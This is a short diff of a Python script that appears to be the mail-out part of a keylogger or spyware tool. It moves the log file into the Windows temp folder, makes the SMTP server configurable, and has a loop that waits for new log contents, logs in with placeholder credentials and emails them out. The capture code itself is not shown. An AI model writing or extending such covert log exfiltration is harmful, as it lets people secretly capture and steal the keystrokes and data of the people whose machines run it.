@@ -6,9 +6,10 @@ from time import sleep
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
-email = 'youremail' # Change
-passw = 'yourpassword' # Change
-logfile = 'logfile.txt'
+email = 'youremail' # Replace
+passw = 'yourpassword' # Replace
+logfile = 'C:\\Windows\\temp\\logfile.txt'
+mailserver = 'smtp.mail.yahoo.com' # Replace With Your Email Provider Server
 count = 1
 previous = ''
 
@@ -17,7 +18,7 @@ def Send():
     global previous
     while ReadLogFile() == previous or len(ReadLogFile()) == 0:
         continue
-    smtp = smtplib.SMTP('smtp.mail.yahoo.com', 587) # Change Gmail is: smtp.gmail.com
+    smtp = smtplib.SMTP(mailserver, 587)
     smtp.ehlo()
     smtp.starttls()
     smtp.login(email, passw)
